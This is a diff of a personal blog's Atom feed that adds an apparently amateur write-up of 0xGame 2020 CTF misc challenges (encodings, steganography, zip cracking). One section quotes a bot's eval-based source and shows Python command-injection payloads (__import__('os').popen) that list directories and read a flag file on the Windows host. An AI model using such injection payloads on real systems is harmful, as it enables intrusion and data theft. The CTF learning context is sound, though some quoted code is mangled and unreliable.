@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://ayanagi.fun</id>
     <title>ハルカトオク</title>
-    <updated>2020-11-23T07:38:00.587Z</updated>
+    <updated>2020-11-23T08:57:45.595Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://ayanagi.fun"/>
     <link rel="self" href="http://ayanagi.fun/atom.xml"/>
@@ -10,6 +10,15 @@
     <logo>http://ayanagi.fun/images/avatar.png</logo>
     <icon>http://ayanagi.fun/favicon.ico</icon>
     <rights>All rights reserved 2020, ハルカトオク</rights>
+    <entry>
+        <title type="html"><![CDATA[炒粉如何避免粘锅]]></title>
+        <id>http://ayanagi.fun/8EpxvmEHy/</id>
+        <link href="http://ayanagi.fun/8EpxvmEHy/">
+        </link>
+        <updated>2020-11-23T07:44:37.000Z</updated>
+        <content type="html"><![CDATA[<p>todo</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[misc一些环境的配置问题]]></title>
         <id>http://ayanagi.fun/atFgXsbYK/</id>
@@ -89,16 +98,193 @@
         <link href="http://ayanagi.fun/0xGame/">
         </link>
         <updated>2020-11-22T12:13:28.000Z</updated>
-        <content type="html"><![CDATA[<p>todo</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[BUUCTF-misc wp]]></title>
-        <id>http://ayanagi.fun/BUUCTF/</id>
-        <link href="http://ayanagi.fun/BUUCTF/">
-        </link>
-        <updated>2020-11-22T12:05:05.000Z</updated>
-        <content type="html"><![CDATA[<p>Todooooo</p>
+        <content type="html"><![CDATA[<h3 id="签到题">签到题</h3>
+<p>查看rules可以得到flag</p>
+<p><code>0xGame{Welc0m_to_0xGame2020}</code></p>
+<h3 id="easybase">easyBase</h3>
+<p>一眼看出base64加密，base16 解密即可</p>
+<h3 id="qr_repair">QR_repair</h3>
+<p>qq截图两张不全的二维码，用美图秀秀拼在一起，百度找一张二维码角的图片贴上去，再用微信扫码即可</p>
+<h3 id="lowerbase64">lowerBase64</h3>
+<p>每四个字符一组穷举改大小写解出<br>
+官方wp：<br>
+Base64会把原文的3个字节为一组，一共是24bits，6bits一组重组为4个新的字符。所以我们爆破时需<br>
+要以4个一组，枚举所有字母大小写的组合，然后进行解码。<br>
+exp:</p>
+<pre><code class="language-python">from base64 import b64decode from itertools import product 
+c = 'mhhnyw1lezviodq1ntkxltmwmditngjlny1hzgi5lwu4m2q1ntcymtblnx0=' 
+table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-{}' 
+
+flag = b&quot;&quot; 
+real_data = &quot;&quot;
+ for i in range(0, len(c), 4):
+     pos = [] 
+     for char in c[i:i+4]: 
+         pos.append([char.lower(), char.upper()]) 
+     cases = [&quot;&quot;.join(k) for k in product(*pos)]
+     for case in cases:
+          if all(chr(char) in table for char in b64decode(case)):
+               real_data += case
+</code></pre>
+<h3 id="pcap">pcap</h3>
+<p>wireshark打开 搜索HTTP POST发现有文件上传，类型为zip，导出HTTP对象为zip，解压得到图片改宽高<br>
+一个小非预期：binwalk可以直接分离出zip文件</p>
+<h1 id="week2">week2</h1>
+<h3 id="differentpic">Differentpic</h3>
+<p>stegsolve打开image compare模式发现二维码 保存二维码打开更改滤镜扫码得到flag</p>
+<h3 id="extract">Extract</h3>
+<p>Binwalk解压得到二维码，扫码提示stegpy，搜索stegpy，发现使用方法，使用stegpy对图片解密得到flag</p>
+<h1 id="week3">week3</h1>
+<h3 id="threethousand">threeThousand</h3>
+<p>编写脚本</p>
+<pre><code class="language-python">import os
+import shutil
+import zipfile
+import random
+from os.path import join, getsize
+
+fileIndex = 3000
+
+while(fileIndex != 1):
+    fileName = &quot;%d.zip&quot; % fileIndex
+    print(&quot;begining extract: &quot; + fileName)
+    f = zipfile.ZipFile(fileName, 'r')
+    for i in range(0, 100):
+        try:
+            f.extractall(pwd = ('%02d' % i).encode(&quot;utf-8&quot;), path = r&quot;./&quot;)
+            print(&quot;pwd = %02d&quot; % i)
+            break
+        except:
+            pass
+
+    f.close()
+    os.remove(r&quot;./%s&quot; % fileName)
+    fileIndex = fileIndex - 1
+</code></pre>
+<h3 id="easymisc">easyMisc</h3>
+<p>按F12发现两行</p>
+<p><code>&lt;!--ZWFzeU1pc2MvZmxhZy56aXA=--&gt;</code></p>
+<p><code>&lt;!--ZWFzeU1pc2MvcmVjb3JkLndhdg==--&gt;</code></p>
+<p>都是base64加密，解密后的结果粘贴补充到地址栏可以得到压缩包和wav，猫猫hint的图用stegpy解密得知从wav里获取压缩包密码(并没有什么意义的hint)，au打开,是DTMF 得到压缩包密码,解压图片使用stegpy解开得flag</p>
+<h1 id="week4">week4</h1>
+<h3 id="flip">flip</h3>
+<p>解压文件夹后au打开pwd.mp3写出摩斯电码，解密，按照题目说法把密码顺序调转打开压缩包，得到txt文件将里面的二进制数逐一逆序后放入JDK，二进制转ascii得到第二个密码，压缩包里隐藏了一张图片需要在kali里binwalk出来，图片已加密，刚好输入第二个密码得到flag图片，扫描二维码可得flag</p>
+<h3 id="hex酱">Hex酱</h3>
+<p>不会python 不会做，唯一一个没出来的misc题<br>
+官方wp：<br>
+其实是一道web题<br>
+源码：</p>
+<pre><code class="language-python">import random 
+import base64 
+import hashlib 
+wrong_msg = [&quot;我可运行不了这种呀&quot;,&quot;不支持这么写啦&quot;, &quot;看不懂这种呀&quot;, &quot;哎呀，没有运行成功~&quot;] 
+def keyword_filter(keyword, msg): 
+    for i in keyword: 
+        if i not in msg: 
+            return False return True 
+def py_filter(msg): 
+    for keyword in [&quot;class&quot;, &quot;eval&quot;, &quot;exec&quot;,&quot;input&quot;,&quot;listdir&quot;, &quot;help&quot;,&quot;powershell&quot;, &quot;cmd&quot;, &quot;shutdown&quot;, &quot;del&quot;, &quot;logoff&quot;, &quot;sys&quot;, &quot;globals&quot;, &quot;builtins&quot;, &quot;getattr&quot;, &quot;pow&quot;]: 
+        if keyword_filter(keyword, msg): 
+            return [False, keyword] 
+    if &quot;**&quot; in msg: 
+            return [False,&quot;**&quot;] 
+    return [True] 
+def do_python(msg): 
+    try:
+        msg = msg[6:-1] 
+        print(msg) 
+        key_word = py_filter(msg) 
+        if key_word[0]: 
+            temp = eval(msg) 
+            else:return &quot;包含关键词：&quot;+key_word[1] 
+            if temp != None: 
+                return str(temp) 
+            else:
+                return random.choice(wrong_msg) 
+        except: 
+            return random.choice(wrong_msg) 
+def rcode(msg): 
+    if msg[:6] == &quot;print(&quot; and msg[-1] == &quot;)&quot;: 
+        return [True, do_python(msg)] 
+    if (msg[:4] == &quot;md5(&quot; or msg[:4] == &quot;MD5(&quot;) and msg[-1] == &quot;)&quot;: 
+        return [True, hashlib.md5(msg[4:-1].encode()).hexdigest()] 
+    if (msg[:7] == &quot;sha256(&quot; or msg[:7] == &quot;SHA256(&quot;) and msg[-1] == &quot;)&quot;:
+         return [True, hashlib.sha256(msg[7:-1].encode()).hexdigest()]
+    if (msg[:7] == &quot;sha512(&quot; or msg[:7] == &quot;SHA512(&quot;) and msg[-1] == &quot;)&quot;: 
+        return [True, hashlib.sha512(msg[7:-1].encode()).hexdigest()]
+    if msg[:10] == &quot;b64encode(&quot; and msg[-1] == &quot;)&quot;:
+         return [True, base64.b64encode(msg[10:-1].encode()).decode()] 
+    if msg[:10] == &quot;b64decode(&quot; and msg[-1] == &quot;)&quot;:
+        return [True, base64.b64decode(msg[10:-1]).decode()] 
+return [None]
+</code></pre>
+<p>就是调用eval执行python代码，绕过黑名单过滤进行一个python命令注入就可以拿到flag<br>
+黑名单是只要出现了某个关键词中的所有字符就会过滤<br>
+其实过滤没起什么作用，看起来过滤了很多，但是 import os 没过滤<br>
+windows下对大小写不敏感，全大写就行，所以拿flag的姿势非常多<br>
+二进制编码也行<br>
+最简单的使用os库执行系统命令：</p>
+<p><code>print(__import__('os').popen('WHOAMI').read()) izozp2s3d5jnzaz\administrator</code></p>
+<p>列当前目录文件：</p>
+<pre><code class="language-python">print(__import__('os').popen('DIR').read()) 
+2020/11/03 15:52 &lt;DIR&gt; . 
+2020/11/03 15:52 &lt;DIR&gt; .. 
+2020/08/11 11:39 &lt;DIR&gt; app 
+2020/08/11 11:39 &lt;DIR&gt; conf 
+2020/08/11 11:39 &lt;DIR&gt; data 
+2020/09/24 16:23 &lt;DIR&gt; go-cqhttp 
+2020/08/11 11:39 &lt;DIR&gt; httpapi 
+2020/09/22 20:38 1,312 main_bot.py 
+2020/09/18 01:20 1,813 massage_filter.py 
+2020/11/03 15:52 1,850 runcode.py 
+2020/09/18 01:20 &lt;DIR&gt; __pycache__
+</code></pre>
+<p>查看当前路径：</p>
+<pre><code class="language-python">print(__import__('os').popen('CD').read()) C:\Users\Administrator\Desktop\Game\HexQBot
+
+</code></pre>
+<p>查看上一级目录：</p>
+<pre><code class="language-python">print(__import__('os').popen('DIR ..\\').read()) 
+2020/09/30 00:33 &lt;DIR&gt; . 
+2020/09/30 00:33 &lt;DIR&gt; .. 
+2020/10/27 00:13 &lt;DIR&gt; HexQBot 
+2020/09/30 00:33 9,440,520 HexQBot.zip 
+2020/09/30 00:33 &lt;DIR&gt; __MACOSX
+</code></pre>
+<p>查看桌面文件：</p>
+<pre><code class="language-python">#有时候qq会因为消息长度限制导致无回显，dir命令加个/b就好了 #一般windows题，flag经常在桌面上 
+print(__import__('os').popen('DIR /B ..\\..\\').read())
+或者
+print(__import__('os').popen('DIR /B %USERPROFILE%\\DESKTOP').read()) 
+或者
+print(__import__('os').popen('DIR /B C:\\USERS\\ADMINISTRATOR\\DESKTOP').read()) 
+BtSoft.exe
+Game 
+go-cqhttp-v0.9.17-windows-amd64.zip 
+Google Chrome.lnk 
+here_is_flag.txt 
+HexQBot 
+HexQBot - 副本 
+HexQBot - 副本.zip 
+jdk-14.0.2_windows-x64_bin.exe 
+Mirai整合包Dice+铃心564 
+Mirai整合包Dice+铃心564.zip 
+pycryptodome-3.9.8-cp36-cp36m-win_amd64.whl 
+python-3.7.6-amd64.exe 
+task 
+Visual Studio Code.lnk yafu-1.34 
+yafu-1.34.zip 
+宝塔面板.lnk
+</code></pre>
+<p>在桌面看到flag文件： here_is_flag.txt<br>
+查看flag：</p>
+<pre><code class="language-python">print(__import__('os').popen('TYPE %USERPROFILE%\\DESKTOP\\HERE_IS_FLAG.TXT').read()) 或者使用通配符?： 
+print(__import__('os').popen('TYPE %USERPROFILE%\\DESKTOP\\????_?? _????.???').read()) 
+或者*： 
+print(__import__('os').popen('TYPE %USERPROFILE%\\DESKTOP\\HER*').read()) 
+#0xGame{621a9c2d-0f24-40fc-b5e2-8d8018e5165b}
+</code></pre>
+<p>下次出windows题可能把flag放在内网服务了，搞一个域渗透？</p>
 ]]></content>
     </entry>
 </feed>
